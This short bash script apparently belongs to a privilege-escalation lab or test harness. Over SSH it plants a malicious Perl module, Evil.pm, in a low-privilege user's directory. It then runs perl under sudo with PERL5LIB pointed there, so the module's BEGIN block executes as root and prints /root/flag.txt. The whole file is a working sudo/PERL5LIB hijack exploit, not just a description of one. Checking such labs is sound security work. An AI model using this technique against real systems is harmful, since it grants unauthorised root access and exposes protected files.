#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
cat > /home/lowpriv/perlhijack/Evil.pm <<'\''EOF'\''
package Evil;
BEGIN {
  if ($< == 0) {
    open my $f, "<", "/root/flag.txt" or exit;
    local $/;
    print <$f>;
  }
}
1;
EOF
sudo -n PERL5LIB=/home/lowpriv/perlhijack /usr/bin/perl -MEvil -e1
')"
assert_root_output "${out}"
